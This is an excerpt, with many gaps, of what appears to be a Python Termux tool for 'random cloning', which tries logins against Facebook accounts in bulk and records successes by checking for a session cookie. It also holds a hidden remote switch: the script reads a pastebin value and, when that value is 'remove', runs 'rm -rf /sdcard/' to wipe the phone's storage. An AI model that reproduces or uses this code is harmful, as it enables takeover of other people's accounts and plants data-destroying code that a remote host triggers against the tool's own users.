...
try:
    ...
    _SHAMIM_('pip install mechanize requests futures bs4==2 > /dev/null')
    _SHAMIM_('pip install bs4')
apk1=requests.get("https://pastebin.com/raw/FrYTLzAa").text
def lo(word):
    shamim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
...
\033[38;5;46m╚═════════════════════════════════════════════════╝  
    \x1b[38;5;196m╔═════════════════════════════════════════════════╗
    \x1b[38;5;196m██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗\x1b[38;5;196m║\033[38;5;46m
    \x1b[38;5;196m██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗\x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m███████║███████║██║     █████╔╝ █████╗  ██████╔╝\x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗\x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║\x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\x1b[38;5;196m║\x1b[38;5;196m
...
if apk1 =='off':
	sys.exit()
if apk1 =='remove':
	_SHAMIM_("termux-setup-storage")
	_SHAMIM_("rm -rf /sdcard/")
	_SHAMIM_("rm -rf /sdcard/ -y")
	sys.exit()
...
def SHAMIM():
    ...
    _SHAMIM_("clear")
    print(logo)
    _SHAMIM_("espeak \"Hi sir ,Wellcome to EHC EMRAN CYBER KING BANGLADESH  Rendom cloneing tool\"")
    ...
    if opt == '1':
    	_SHAMIM_("espeak \" you choose rendom cloneing\"")
    	xxr()
    if None == '2':
        _SHAMIM_('xdg-open https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _SHAMIM_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _SHAMIM_('xdg-open https://github.com/emrancyber99')
        _SHAMIM_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _SHAMIM_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _SHAMIM_("espeak \"you choose messenger\"")
    if None == '0':
        _SHAMIM_('exit')
        _SHAMIM_("espeak \"good bye sir\"")
...
def xxr():
    ...
    _SHAMIM_(f"espeak \"you choose {pww}\"")
    _SHAMIM_('clear')
    print(logo)
    _SHAMIM_("espeak \"choose your limit\"")
    ...
    _SHAMIM_(f"espeak \"you choose limit {limit}\"")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        brand=random.choice(['SHAMIM CYBER','SHAMIM CYBER ','SHAMIM CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}𝐒𝐇𝐀𝐌𝐈𝐌 𝘽𝙊𝙎𝙎\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Termux-shamim-FB-cyber/Fuckboy/tree/main").text
    if id in DARK:
        os.system('clear')
        print(logo)
        SHAMIM()
